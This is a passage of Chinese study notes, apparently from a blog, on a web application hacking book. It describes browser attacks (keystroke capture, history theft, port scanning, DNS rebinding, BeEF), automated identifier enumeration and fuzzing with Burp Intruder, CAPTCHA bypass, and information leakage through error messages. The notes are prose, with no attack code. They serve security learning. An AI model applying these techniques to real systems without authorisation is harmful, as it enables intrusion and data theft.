<p>当发现网页上使用 ActiveX 控件时，一种探测该控件是否存在漏洞的方法为修改调用该控件的代码，替换提交给控件的参数，观察控件的执行结果；</p>
<ul>
<li>探查是否存在缓冲区溢出漏洞（详见第 16 章的描述）；</li>
<li>查看 ActiveX 的方法，是否为一些高风险的方法，例如 LaunchExe 等；</li>
</ul>
<blockquote>
<p>页面上的源代码常常并没有调用控件中的所有方法，因此，可以通过一些第三方工具，例如 COMRaider，枚举出控件的所有方法；</p>
</blockquote>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210325075737.png"></p>
<h3 id="防止-ActiveX-漏洞"><a href="#防止-ActiveX-漏洞" class="headerlink" title="防止 ActiveX 漏洞"></a>防止 ActiveX 漏洞</h3><p>ActiveX 控件本质上是一个编译软件，如果阻止这种类型的软件受到攻击，是一个很大很复杂的课题。主要有以下一些注意事项：</p>
<ul>
<li>发布控件前应进行审查，确保不存在缓冲区溢出之类的漏洞；</li>
<li>任何读取用户输入，并调用文件系统或操作系统的方法，都必须是私有方法，不得对外暴露；</li>
<li>可考虑增加域名确认，仅限特定域名列表中的域名，发起对控件的调用；</li>
<li>可考虑增加参数签名，对所有发给控件的参数，进行签名；如果签名无效，则拒绝调用；</li>
</ul>
<h2 id="攻击浏览器"><a href="#攻击浏览器" class="headerlink" title="攻击浏览器"></a>攻击浏览器</h2><p>同应用程序一样，浏览器本身也是一个应用程序，因此其也不可避免存在漏洞；攻击者如果能够发现并浏览器的漏洞，就可以攻破所有的网站，而不单单是存在漏洞的网站；</p>
<h3 id="记录键击"><a href="#记录键击" class="headerlink" title="记录键击"></a>记录键击</h3><p>当浏览器窗口获得焦点时，JS 脚本可以获取所有键盘输入，因此攻击者通过键击劫持，可以捕获用户输入的敏感数据；</p>
<p>一种攻击方法是攻击者在页面的 iframe 注入其设计的脚本，捕获用户的键盘输入，并将该输传递给顶层标签，同时在用户输入暂停时，暂时放弃激活状态，这样可以用户的输入仍然能够出现在顶层窗口中，并且光标也会处于闪烁的状态，实现在用户在毫无知觉的情况下，捕获其输入；</p>
<h3 id="窃取浏览器历史记录与搜索查询"><a href="#窃取浏览器历史记录与搜索查询" class="headerlink" title="窃取浏览器历史记录与搜索查询"></a>窃取浏览器历史记录与搜索查询</h3><p>这个很有意思，攻击者通过 JS 代码，动态创建很多常用站点的链接，以及一些常用的搜索关键字，注入在网页中；如果用户最近访问过这些站点，或者执行过相关的查询，浏览器将根据最近的浏览记录，将相应的链接标记为已访问的颜色（与未访问过的链接颜色有所不同），之后，攻击者再使用 JS 代码中的 getComputedStype 函数，查询其创建的链接的颜色样式，即可获知哪些链接是用户最近访问过的；</p>
<h3 id="获知用户登录过的应用程序"><a href="#获知用户登录过的应用程序" class="headerlink" title="获知用户登录过的应用程序"></a>获知用户登录过的应用程序</h3><p>攻击者枚举其想攻击的应用程序，向这些应用程序的某个受保护页面（需登录才能访问的页面）发送请求；虽然攻击者并不能访问目标应用程序返回的响应内容，但是如果这些页面不能被访问，那么目标应用程序会发送错误消息，或者发送重定向地址，此时攻击者通过提前设计好的错误处理函数，即可获知其发送的请求的状态，进而知道哪些网站是用户登录过的；根据获得的已登录的清单，攻击再有针对性的设计跨站点请求伪造，提高攻击效率；</p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>攻击者可以利用 JS 代码，先确定用户主机的 IP 地址，得到本地网络的 IP 范围，然后对任意 IP 地址和端口发送请求，以测试其连通性；虽然同源策略可以阻止 JS 代码读取请求的响应，但是 JS 能够检测到请求错误或者未收到请求。通过这种方式，攻击者即可知道本地有哪些主机及相应的端口是可供访问的，为下一步攻击做准备；</p>
<h3 id="攻击本地网络其他设备"><a href="#攻击本地网络其他设备" class="headerlink" title="攻击本地网络其他设备"></a>攻击本地网络其他设备</h3><p>当获知本地可访问的主机和端口后，攻击者接下来可以有针对性的做进一步探查。例如运行定制化的脚本和错误处理函数，尝试获取可访问主机上的某个常用内容；如果该内容存在，错误函数未被触发，说明该主机符合某种预设的类型；之后，再利用该类型设备的已知漏洞，对其进行攻击；例如尝试使用默认密码进行登录等；</p>
<blockquote>
<p>如果攻击者能够控制路由器，那么就可以通过设置 DNS 重新绑定，来避开同源策略的限制，从而能够实施跨站点脚本攻击，获取目标应用程序的响应内容；</p>
</blockquote>
<h3 id="利用非-HTTP-服务"><a href="#利用非-HTTP-服务" class="headerlink" title="利用非  HTTP 服务"></a>利用非  HTTP 服务</h3><p>同一台机器上，可能在不同的端口运行着一些非 HTTP 服务，可能是为了兼容性考虑，大多数非 HTTP 服务都接受意外的输入，有些服务甚至接受 HTTP 消息头，并对其进行处理；如果发生这种情况的话，攻击者就可以在消息主体中发送该非 HTTP 服务可识别的二进制内容（HTTP 协议可用来发送任意内容的消息主体）</p>
<p>如果该非 HTTP 服务本身存在已知的漏洞，则攻击者就可以加以利用；甚至，攻击者还可以利用该非 HTTP 服务为跳板，对运行同一服务器上的 Web 应用程序发起请求，进行攻击；</p>
<p>要实现这种攻击，需要满足如下一些条件：</p>
<ul>
<li>非 HTTP 服务使用的端口未被浏览器禁止；</li>
<li>非 HTTP 服务接收 HTTP 消息头；</li>
<li>非 HTTP 服务会在其响应中回显一部分请求内容；</li>
<li>浏览器接收不包含有效 HTTP 消息头的响应，并且将部分响应内容做为 HTML 处理（出于兼容性考虑，正常会处理）；</li>
<li>浏览器在处理 cookie 时，会忽略端口号（正常会忽略）；</li>
</ul>
<h3 id="利用浏览器漏洞"><a href="#利用浏览器漏洞" class="headerlink" title="利用浏览器漏洞"></a>利用浏览器漏洞</h3><p>如果用户安装的某个版本的浏览器或者浏览器扩展存在已知的漏洞，则攻击者就可以利用该漏洞，例如利用 Java Applet 扩展中的已知漏洞，与本地计算机或者其他非 HTTP 服务进行二进制通信；攻击者可以利用该通信渠道，对端口进行扫描，发现其他存在的服务，并进一步利用该服务存在的已知漏洞；</p>
<h3 id="DNS-重新绑定"><a href="#DNS-重新绑定" class="headerlink" title="DNS 重新绑定"></a>DNS 重新绑定</h3><p>这个有点意思，工作原理如下：</p>
<ul>
<li>攻击者在其控制的服务器上放置恶意脚本；</li>
<li>在 DNS 域名服务器上，攻击者将其域名解析配置到上一步包含恶意脚本的服务器，并将 TTL 时间配置很短，以避免其解析被缓存；</li>
<li>当受害者访问攻击的网站时，会自动下载恶意脚本到本地；</li>
<li>该恶意脚本会向攻击者的网站再发送一次请求，由于 TTL 存放时间很短，浏览器因此再次向 DNS 域名服务器提交解析请求；</li>
<li>此时攻击者将 DNS 域名解析配置修改为目标应用程序的 IP；</li>
<li>浏览器获得目标应用程序的 IP，但却误以为是攻击者控制的域名的 IP，并向其发出请求；</li>
<li>该请求将被目标应用程序接收并处理和返回响应；</li>
<li>浏览器收到响应后，误以为是攻击者的域返回的响应，因此恶意脚本可以读取该响应的内容，并发送给攻击者；</li>
</ul>
<h3 id="借助浏览器框架"><a href="#借助浏览器框架" class="headerlink" title="借助浏览器框架"></a>借助浏览器框架</h3><p>针对 XSS 漏洞的攻击，市面上已经有很多成熟的浏览器攻击框架，用来演示如何利用这种漏洞进行攻击；这意味着当攻击者发现漏洞后，可以直接利用这些现成的框架，发起攻击；这些框架会利用已知的 XSS 漏洞，注入 JS 恶意脚本，定期向攻击者控制的服务器发送其收集到的数据，并可以接收攻击者发送的指令；</p>
<p>这些框架提供以下常用的功能：</p>
<ul>
<li>记录用户的键击，并发送给攻击者；</li>
<li>劫持用户的会话；</li>
<li>“指纹”识别用户使用的浏览器（攻击者可针对性的利用该浏览器的已知漏洞）；</li>
<li>对用户私有网络中的其他主机进行进行端口扫描，并将结果发送给攻击者；</li>
<li>通过用户的浏览器发送恶意请求，向其他 Web 应用程序实施攻击；</li>
<li>蛮力攻击用户的浏览历史记录，并将结果发送给攻击者；</li>
</ul>
<blockquote>
<p>攻击框架 BeEF 的使用示例：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210326073933.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210326073959.png"></p>
<p>另一款功能强大的框架是 XSS Shell，可注入任意的 JS 代码，即使用户已经跳转到应用程序的其他页面，它还会驻留在用户的浏览器中；</p>
</blockquote>
<h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p>攻击者通过中途拦截并更改网络请求来实施攻击，例如在无线公共热点和共享办公网络的场景中；很多 Web 应用程序仅在部分包含敏感数据的页面使用 HTTPS 来加密传输，而不是所有的连接都是加密的，这就为中间人攻击者创造了机会，尤其是当非加密页面使用绝对 URL 来引用脚本文件的话；攻击者可以替换这些脚本文件，注入恶意代码，实现攻击目的；</p>
<p>由于同源策略的存在，虽然攻击者更改了引用脚本的 URL 地址，但是此时该页面是在 HTTP 下传输的，新脚本文件中的代码，并无法访问原程序通过 HTTPS 协议传输的内容；接下来攻击者需要修改某个 HTTP 响应，构建重定向，让浏览器将 HTTP 切换为 HTTPS 并加载同一页面（或者在其他响应中改写页面上的 URL，让用户在不知情的情况下，点击改写后中的 URL）；</p>
<blockquote>
<p>此处有疑问：为什么浏览器不是使用 HTTPS 响应返回的页面中的脚本，而不是使用原 HTTP 响应返回的页面中的脚本？待后续做实验进行验证</p>
</blockquote>
<p>即使应用程序不使用未加密的 HTTP 传输内容，攻击者仍然可以修改用户访问其他非加密域的请求，并返回重定向的响应，该响应将诱使用户的浏览器向目标应用程序发起 HTTP 请求，然后攻击者拦截该请求，并返回任意的内容（此时即使应用程序的服务端都不监听 80 端口也不起作用，因为请求根本就没有到达应用程序的服务器）；接下来攻击者可以使用以下攻击技巧来攻击应用程序的 HTTPS 传输：</p>
<ul>
<li>当拦截到用户浏览器向目标程序发出的非加密 HTTP 请求后，攻击者通过拦截并返回自定义的响应，修改用户的 cookie 值（不管用户之前是否已经通过 HTTPS 收到了 cookie 值，都会被修改）；如果该 cookie 被原程序的代码以不安全的方式进行处理，例如存在读取 cookie 的 XSS 漏洞，那么攻击者通过针对性的设计 cookie，就可以利用该漏洞，实现攻击目的；</li>
<li>有些浏览器扩展并不区分和隔离普通 HTTP 和加密 HTTPS 的响应内容，而是将它们视为同一来源，因此攻击者通过 HTTP 返回的脚本，就可以通过这些扩展来访问用户使用 HTTPS 访问的内容（借刀杀人）；</li>
</ul>
<blockquote>
<p>当在不安全的网络（例如公共网络 通过 HTTPS 访问敏感内容时，应将浏览器的代理选项设置为“对除 HTTPS 以外的所有协议，使用无效的本地端口”，这样可以一定程度的降低攻击风险；</p>
</blockquote>
<h2 id="小结-8"><a href="#小结-8" class="headerlink" title="小结"></a>小结</h2><p>严重的缺陷常常隐藏在大量无关紧要的客户端缺陷中，攻击者可以利用这类缺陷对应用程序实施攻击；</p>
<h1 id="14-定制攻击自动化"><a href="#14-定制攻击自动化" class="headerlink" title="14. 定制攻击自动化"></a>14. 定制攻击自动化</h1><h2 id="应用定制自动化攻击"><a href="#应用定制自动化攻击" class="headerlink" title="应用定制自动化攻击"></a>应用定制自动化攻击</h2><p>对攻击进行自动化，可以提高攻击的效率；攻击自动化有以下几个常用的场景：</p>
<ul>
<li>枚举标识符：大多数 Web 应用程序会使用某种标识符来标识资源；标识符的范围也意味着有效资源的数量，因此通过自动枚举标识符，并发送请求，即可快速知道资源的存在范围；</li>
<li>获取数据：通过自动化大量发送请求来爬取有用的数据；</li>
<li>漏洞模糊测试：自动化发送大量设计过的异常字符串，观察应用程序的响应，即可探查应用程序存在哪些潜在的攻击面，作为下一步详细探查的筛选工作；</li>
</ul>
<h2 id="枚举有效的标识符"><a href="#枚举有效的标识符" class="headerlink" title="枚举有效的标识符"></a>枚举有效的标识符</h2><p>一些常见的需要枚举有效标识符的情况：</p>
<ul>
<li>枚举用户名列表，发送大量请求，根据应用程序的响应判断哪些用户名是存在的；</li>
<li>枚举各种资源标识符，如文件ID，账号、雇员编号、日志记录等，根据应用程序的响应，判断存在哪些资源；</li>
<li>枚举令牌（如果生成的令牌存在规律的话），判断存在哪些有效的令牌；</li>
</ul>
<h3 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h3><p>先做前期的探查，包括以下两个动作（请求响应对）：</p>
<ul>
<li>请求的参数包含某个标识符；</li>
<li>当改变这个参数值，服务器的响应也相应发生变化；并能够根据变化的区分，判断标识符是否有效；</li>
</ul>
<h3 id="探测触点"><a href="#探测触点" class="headerlink" title="探测触点"></a>探测触点</h3><p>一些常见的响应出现变化的特征</p>
<h4 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a>HTTP 状态码</h4><ul>
<li>200，请求成功</li>
<li>301或302，请求被重定向到另外一个地址；</li>
<li>401或403，请求未授权或被禁止</li>
<li>404，请求的资源不存在；</li>
<li>500，服务器处理请求的过程中发生错误；</li>
</ul>
<h4 id="响应长度"><a href="#响应长度" class="headerlink" title="响应长度"></a>响应长度</h4><p>通常应用程序会使用某个页面模板，并填充数据，生成最终的 HTML 页面；当请求错误时，模板的长度一般要小于正常的模板，因此，通过响应的长度，即可判断请求是否成功；</p>
<h4 id="响应主体"><a href="#响应主体" class="headerlink" title="响应主体"></a>响应主体</h4><p>请求成功和失败的响应主体正常有所区别，并可以通过某个关键字识别出来，因此可以通过在响应中搜索这个关键字符串，来判断请求是否成功；</p>
<h4 id="Location-消息头"><a href="#Location-消息头" class="headerlink" title="Location 消息头"></a>Location 消息头</h4><p>有些应用程序使用重定向处理资源请求，当成功时，重定向到资源页面；当失败时，重定向到失败页面；因此，通过 Location 消息头字段可以判断请求是否成功；</p>
<h4 id="Set-Cookie-消息头"><a href="#Set-Cookie-消息头" class="headerlink" title="Set-Cookie 消息头"></a>Set-Cookie 消息头</h4><p>当请求有效时，有些应用程序会在 cookie 消息头中进行标识；例如当用户提交的密码正确时，响应会携带 cookie；如果密码无效，则不会；</p>
<h4 id="时间延迟"><a href="#时间延迟" class="headerlink" title="时间延迟"></a>时间延迟</h4><p>当请求无效时，有可能客户端很多就会收到响应；如果请求有效时，有可能服务器接下来要做很多工作，例如进行大量的计算，因此，通过时间延迟的长短，即可判断所提交的请求是否有效；</p>
<h3 id="编写攻击脚本"><a href="#编写攻击脚本" class="headerlink" title="编写攻击脚本"></a>编写攻击脚本</h3><p>虽然可以使用命令行脚本来编写，但由于命令行的表达式能力天生比较弱鸡，正常还是使用一些高级语言比较好，例如 Python、Java、Javascript、C# 等；</p>
<h3 id="JAttack"><a href="#JAttack" class="headerlink" title="JAttack"></a>JAttack</h3><p>除了自己编写攻击脚本外，更好的方法是使用一些现成的开源工具，例如 JAttack；JAttack 是用 Java 编写的，它的基本概念是将攻击请求设计成一个类，并通过属性控制哪些字段要在攻击中修改，哪些不能修改，并附上修改的方法，这样就可以很灵活的发送各种预期请求；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210327085857.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210327091435.png"></p>
<h2 id="获取有用的数据"><a href="#获取有用的数据" class="headerlink" title="获取有用的数据"></a>获取有用的数据</h2><p>定制并发送专门设计的请求，不但可以利用漏洞获取有用的数据，有时候，即使没有漏洞，仅仅通过枚举的方式，也可以获取到有用的数据，常见情况如下：</p>
<ul>
<li>应用程序允许用户查看自己的订单，只要在请求中枚举出有效的订单号，就可以查看到其他用户的订单；</li>
<li>通过回答预设问题来实现忘记密码的功能，通过枚举大量的用户名，就可以获取大量的预设问题，然后可从中找到容易猜测答案的问题；</li>
<li>应用程序的某个接口接受一个用户 id，然后就会展示用户的相关信息，包括权限情况等，因此攻击者通过枚举 ID 即可以发现哪些用户账号拥有管理员权限，即可缩小范围，做进一步的针对性攻击；</li>
</ul>
<h2 id="常见漏洞模糊测试"><a href="#常见漏洞模糊测试" class="headerlink" title="常见漏洞模糊测试"></a>常见漏洞模糊测试</h2><p>在探查漏洞的阶段，针对解析过程中已知的各种请求参数，针对性的替换为各种专门设计的攻击字符串，然后监控应用程序的响应，即可更加快速的发现应用程序中可能存在的各种漏洞，例如 SQL 注入、命令行注入、路径遍历、XSS 漏洞等；</p>
<blockquote>
<p>由于请求参数需要根据应用程序的具体情况进行设计，因此这种类型的定制自动化攻击，往往要比全自动化的工作更有效率；其根本原因在于攻击者可以站在开发者的角度进行换位思考，推测其背后的控制逻辑，这是多数全自动化工具做不到的；</p>
</blockquote>
<h2 id="整合全部功能"><a href="#整合全部功能" class="headerlink" title="整合全部功能"></a>整合全部功能</h2><blockquote>
<p>估计市面上应该有很多将攻击进行自动化的工具，例如本书作者开发的 Burp Intruder，利用这些成熟的工具，可以让攻击更加的快速和高效；</p>
</blockquote>
<p>以下是 Burp Intruder 的一些基本功能介绍</p>
<h3 id="选择替换位置"><a href="#选择替换位置" class="headerlink" title="选择替换位置"></a>选择替换位置</h3><p>在发起大量攻击请求时，基本的作法是在请求中特定位置插入有效荷载，并使用不同的值来替换它；这些插入的位置即可以是请求参数，也可以是请求头部或主体的任何位置；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210329081722.png"></p>
<p> 使用方法：</p>
<ul>
<li>使用 add 按钮为替换位置添加标记，如上面的截图，在添加标记后，替换位置的前面会使用特殊符号标记起点和终点，并用红色显示整个位置；当发起请求后，这些位置将被有效的攻击荷载替换，如果没有替换，则使用原来的值；</li>
<li>使用 auto 按钮可以自动化标记所有可替换的位置，减少手工标记的工作量；</li>
</ul>
<blockquote>
<p>sniper 攻击（狙击）：一次针对一个标记位置，使用所有的有效荷载轮流替换它并发出请求；之后转到下一个位置，重复前面的动作；</p>
<p>非 sniper 攻击：一次请求同时替换多个位置；</p>
</blockquote>
<h3 id="设置替换值"><a href="#设置替换值" class="headerlink" title="设置替换值"></a>设置替换值</h3><p>有效荷载可以自己设计，同时也可以利用 Intruder 现成的内置设计，这样可以节省很多时间，其内置的有效荷载包括：</p>
<ul>
<li>内置现成的数据列表，并且该列表支持自定义的配置，如添加和修改等；</li>
<li>根据模式对荷载进行定制迭代，假设应用程序接受 ABC45D 形式，则迭代器就可以枚举出所有符合这个规则的值；</li>
<li>字符的大小写替换，例如 password 可替换为 p4ssword, passw0rd, Password, PASSWORD 等，可用于实施密码的蛮力攻击；</li>
<li>数字类型的遍历，例如可用于遍历文档 ID、会话令牌等场景；数字支持多种进制，整数、分数、顺序、递增递减、随机等；</li>
<li>日期：对日期类型的输入进行枚举；</li>
<li>支持 Unicode 编码，对恶意字符的进行编码，避开过滤；</li>
<li>支持对字符块输入进行缓冲区溢出漏洞的探查；</li>
<li>支持对特殊字符集生成各种排列组合；</li>
<li>支持字符打乱和位翻转，系统性的操纵参数值的各个部分，探查应用程序背后的处理逻辑；</li>
<li>支持定制化的预处理：当了解到应用程序的某种处理规则时，在提交请求前，可以先对枚举值进行预处理，以通过应用程序的检查，例如各种编码方案、散列操作、大小写修改等；</li>
</ul>
<blockquote>
<p>默认情况下，Intruder 会对请求中的字面量字符进行 URL 编码，不然该请求会由于不符合 HTTP 规则而失效；</p>
</blockquote>
<h3 id="设置响应分析"><a href="#设置响应分析" class="headerlink" title="设置响应分析"></a>设置响应分析</h3><p>在实施攻击前，需要先明确需要分析响应中的哪些属性，例如扫描错误消息以发现潜在漏洞、扫描特定字符串以便 XSS 注入漏洞等；除了使用特定字符串或者正则表达式来搜索匹配外，还可以设置从响应中提取有用的数据；</p>
<h3 id="攻击1：枚举标识符"><a href="#攻击1：枚举标识符" class="headerlink" title="攻击1：枚举标识符"></a>攻击1：枚举标识符</h3><p>假设应用程序支持匿名用户注册，则可以通过注册多个账号，连续多次登录，获取不同账号的令牌，了解令牌的生成规律；</p>
<p>当发现某种规律后，就可以根据该规律，大量生成一些潜在可能有效的令牌，然后找到能够验证令牌是否有效的请求响应对，大量发送请求，筛选出有效的令牌；</p>
<p>假设获取的多个令牌如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210329091008.png"></p>
<p>从中可发现主要是最后3位数在变化，因此，可以就最后3位进行枚举</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210329091051.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210329091249.png"></p>
<p>请求一个需要登录后才访问的页面，如用户个人令牌页，如果令牌有效，正常会收到 200 响应；如果无效，正常会被重定向到登录页面；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210329091225.png"></p>
<p>同时，虽然都是 200 的响应，但根据响应长度的不同，我们还可以猜测到某些令牌返回的响应页面不同，很有可能这些令牌背后是拥有更高级权限的用户，所以页面上显示有更多的菜单；可点击查看该响应中的 HTML 源代码进行确认；</p>
<blockquote>
<p>除了状态码外，返回的其他消息头字段如果存在异常，往往意味着里面包含有价值的信息，应该特别进行留意；</p>
</blockquote>
<h3 id="攻击2：获取信息"><a href="#攻击2：获取信息" class="headerlink" title="攻击2：获取信息"></a>攻击2：获取信息</h3><p>应用程序某些页面的请求可能使用 id 参数，此时可以以当前某个有效的 id 为起点，改变 id 的最后两位数，发起请求进行遍历，并配置 Intruder 中的匹配选项，提取指定位置的内容；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330072455.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330072530.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330072820.png"></p>
<h3 id="攻击3：应用程序模糊测试"><a href="#攻击3：应用程序模糊测试" class="headerlink" title="攻击3：应用程序模糊测试"></a>攻击3：应用程序模糊测试</h3><p>对于每个 URL，position 选项卡的 auto 功能可以实现自动化的模糊测试，它的原理很简单，即使用常用的有效荷载，逐一替换每一个请求参数，然后收集好响应结果，为下一步分析和发现异常做做好准备工作；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330074650.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330074732.png"></p>
<p>对响应结果进行初步分析可以发现，应用程序可能容易受到 SQL 注入攻击，因为在请求参数中放入一个单引号后，应用程序返回的响应不同，因此接下来可针对该潜在漏洞，进一步分析其利用的可能性；</p>
<blockquote>
<p>当现某个潜在漏洞时，可将响应发送到 Repeater 工具，该工具用来针对某个潜在漏洞，修改参数的多种形式，多次重新提交请求，以探查应用程序的处理逻辑，以及避开过滤或者净化的办法；</p>
</blockquote>
<h2 id="实施自动化的限制"><a href="#实施自动化的限制" class="headerlink" title="实施自动化的限制"></a>实施自动化的限制</h2><p>应用程序很可能存在某种防御攻击者提交大量自动化请求的机制，常见的两类：</p>
<ul>
<li>会话终止：当应用程序发现存在异常请求时，就终止当前会话；或者在某个关键功能中使用反 CSRF 令牌之类的临时参数，或引入多阶段验证，在接收当前请求前，需要先完成一系列的其他请求；</li>
<li>CAPTCHA 控件：专门在注册用来防御机器人；</li>
</ul>
<h3 id="会话终止"><a href="#会话终止" class="headerlink" title="会话终止"></a>会话终止</h3><p> 针对应用程序终止会话的防御机制，Burp 通过引入下面一些组件来尽可能避开防御机制：</p>
<h4 id="cookie-库"><a href="#cookie-库" class="headerlink" title="cookie 库"></a>cookie 库</h4><p>虽然浏览器会维护一个 cookie 库，Burp 也会自己维护一个，用于相关的组件，同时方便随时根据需要进行更新和修改；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330080354.png"></p>
<h4 id="请求宏"><a href="#请求宏" class="headerlink" title="请求宏"></a>请求宏</h4><p>将多个步骤集成为一个，这样可以在提交每一次的攻击荷载前，先通过宏让应用程序进入接受请求的状态，例如检查当前登录状态、若无效则执行登录获取新会话、获取令牌等工作；</p>
<p>可以使用浏览器来录制宏，并做录制好的每一个步骤配置额外的动作，例如提取有用的信息，用于后续的动作，包括：</p>
<ul>
<li>是否将库中的 cookie 添加到请求中；</li>
<li>是否将响应中的 cookie 添加到库中；</li>
<li>请求参数是否使用预设值，还是使用在响应中获取的值（当存在反 CSRF 令牌时，该方法很有用）；</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330080657.png"></p>
<h4 id="会话处理规则"><a href="#会话处理规则" class="headerlink" title="会话处理规则"></a>会话处理规则</h4><p>原理很简单，即通过对特定请求进行预处理，以避开应用程序的会话限制；由于应用程序可能在不同的功能中使用不同的限制规则，因此需要有针对性的配置规则；当 Burp 发起某个请求时，如果满足预设的匹配条件，就会触发预处理；</p>
<p>匹配规则有：发起请求的 Burp 工具、请求的 URL、请求中的参数名称；</p>
<p>预处理操作包括：添加 cookie ，设置特定的 cookie 或参数值、检查当前会话是否有效并根据结果执行不同的操作、运行宏、提示会话恢复；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330081223.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330081301.png"></p>
<p>配置规则时，有时候避免会出错，导致 Burp 并不按预期的方式进行工作，因此Burp 还提供一项会话处理追踪的功能，用来监控和调试会话处理规则，以便确保配置是否按预期的方式进行；</p>
<h3 id="CAPTCHA-控件"><a href="#CAPTCHA-控件" class="headerlink" title="CAPTCHA 控件"></a>CAPTCHA 控件</h3><p>随着计算机识别图片内容能力的不断强化，事实上现在人类与计算机的水平已经相当，导致 CAPTCHA 已经失去了它在一开始预算起到的作用；</p>
<h4 id="攻击-CAPTCHA-控件"><a href="#攻击-CAPTCHA-控件" class="headerlink" title="攻击 CAPTCHA 控件"></a>攻击 CAPTCHA 控件</h4><p>搞笑的是，有很多应用程序在发送 CAPTCHA 拼图时，还会悄悄的把答案也发过来，一般有以下几种方式：</p>
<ul>
<li>拼图的图像通过 URL 加载，拼图的答案就在 URL 的参数或者图片名称中；</li>
<li>拼图的答案放在某个隐藏表单的字段中；</li>
<li>拼图答案出现在 HTML 注释或其他位置（用于调试）；</li>
</ul>
<p>正常情况下，拼图应该只使用一次后就废弃，但有些应用程序并不是这么做的，而是反复使用；因此，攻击者可以先手工解决某张拼图的答案，然后在请求在反复提交拼图和相应的答案；</p>
<h4 id="自动破解-CAPTCHA-拼图"><a href="#自动破解-CAPTCHA-拼图" class="headerlink" title="自动破解 CAPTCHA 拼图"></a>自动破解 CAPTCHA 拼图</h4><p>目前绝大多数拼图算法都可以被计算机轻松破解，破解的过程如下：</p>
<ul>
<li>删除图像中的噪声；</li>
<li>把图片分割单个字母；</li>
<li>识别每个部分中的字母；</li>
</ul>
<p>目前网上已经有一些非常成熟的库，可以用来处理 CAPTCHA 拼图；针对不同的拼图类型，可以使用不同的库进行处理；事实上，拼图识别效率并不需要 100%，即使只能识别 10%，那么也能够让 10% 的请求变成有效的，而提出大量的请求对计算机来说是最简单不过的任务了；</p>
<h4 id="人类破解者"><a href="#人类破解者" class="headerlink" title="人类破解者"></a>人类破解者</h4><ul>
<li>有一些第三方的付费服务可以调用，让其破解拼图，每破解 1000 个拼图的费用不到 1 美元；</li>
<li>另外攻击者还可以自建一个外表看起来正常的善意的网站，然后实际传输的是目标网站的拼图，并诱使其用户对拼图进行破解；攻击者还经常在其网站上使用竞赛奖励或者免费访问色情内容的方式来吸引用户帮助其破解；</li>
</ul>
<h2 id="小结-9"><a href="#小结-9" class="headerlink" title="小结"></a>小结</h2><p> 思维方式的不同是真正的 Web 应用程序黑客和普通爱好者之间的最大区别，因为任何工具都替代不了人类的智慧；</p>
<h1 id="15-利用信息泄露"><a href="#15-利用信息泄露" class="headerlink" title="15. 利用信息泄露"></a>15. 利用信息泄露</h1><h2 id="利用错误消息"><a href="#利用错误消息" class="headerlink" title="利用错误消息"></a>利用错误消息</h2><h3 id="错误消息脚本"><a href="#错误消息脚本" class="headerlink" title="错误消息脚本"></a>错误消息脚本</h3><p>对于解释型语言来说，其代码实际上是运行在解释器中的，为了方便调试，当发生错误时，大多数解释器都会输出详细的错误信息，以及函数的调用栈等。这意味着如果 Web 应用程序是使用脚本语言来编写的话，如果控制不当，攻击者就有可能获取这些信息，从而为攻击提供便利；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210331090602.png"></p>
<blockquote>
<p>类型不匹配错误：缩小了攻击参数的范围</p>
<p>行号可用来判断每次触发的是否是同一个位置的错误，以及应用程序在处理多个参数时的顺序；</p>
</blockquote>
<h3 id="栈追踪"><a href="#栈追踪" class="headerlink" title="栈追踪"></a>栈追踪</h3><p>当某种由高级语言编写的程序，是运行在某个托管环境中的时候（即解释器，如 Java、C#、Python、JS 等），如果出现了无法处理的错误，那么解释器将会抛出错误，此时浏览器往往会显示完整的栈追踪；栈追踪显示的信息将给攻击带来极大的帮助，主要包括：</p>
<ul>
<li>可通过栈信息详细了解错误发生的原因，从而可以调整输入，避开错误；</li>
<li>如果程序调用第三方的库，则也会同时显示在栈追踪中，此时可以查阅这些第三方库的源代码，了解它们的行为和逻辑，并下载它们在本地进行测试，探查应用程序处理异常输入的逻辑，发现潜在的漏洞；</li>
<li>调用栈中很可能还会显示一些组件调用的情况，通过组件的命名，可以推测应用程序的内部结构和功能；</li>
<li>栈追踪中显示的行号可用来探查应用程序的逻辑；</li>
<li>栈追踪中通常还包括运行环境的信息，例如框架的名称和版本，从而可以根据该信息，搜索查找其已知的漏洞、异常行为和常见的配置错误等；</li>
</ul>
<h3 id="详尽的调试信息"><a href="#详尽的调试信息" class="headerlink" title="详尽的调试信息"></a>详尽的调试信息</h3><p>在开发阶段，开发者通常会让程序输出大量的调试，从而有助于开发者对应用程序进行调试，这些调试信息通常会揭露应用程序当行的运行状态，常见信息包括：</p>
<ul>
<li>保存在会话中的变量值；</li>
<li>数据库等后端组件的主机名称和密码等敏感信息；</li>
<li>服务器中的文件和目录名称；</li>
